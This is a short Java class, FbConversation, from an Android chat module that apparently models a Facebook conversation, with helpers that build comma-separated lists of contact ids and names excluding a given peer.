package com.android.networking.module.chat;

public class FbConversation {

	protected String account;
	protected String id;
	protected Contact[] contacts;

	public String getTo(String peer) {
		String cout = "";
		for (Contact c : contacts) {
			if (!peer.equals(c.id)) {
				cout += c.id + ",";
			}
		}
		return cout;
	}

	public String getDisplayTo(String peer) {
		String cout = "";
		for (Contact c : contacts) {
			if (!peer.equals(c.id)) {
				cout += c.name + ",";
			}
		}
		return cout;
	}

}
